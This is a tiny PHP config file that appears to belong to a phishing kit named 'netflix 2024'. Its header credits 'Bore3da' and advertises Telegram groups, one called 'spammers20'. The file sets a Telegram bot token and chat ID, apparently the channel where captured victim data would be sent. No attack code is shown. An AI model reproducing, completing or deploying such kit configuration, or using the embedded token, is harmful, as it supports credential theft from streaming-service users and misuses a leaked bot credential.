<?php 

/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   netflix 2024
 * Author      :   Bore3da
 * channel Telegram  :  https://t.me/spammers20
 */



$bot_token = "6833TC3UrlrCyYQizDqAY"; // token
$chat_ids = "-486"; // chat ID


?>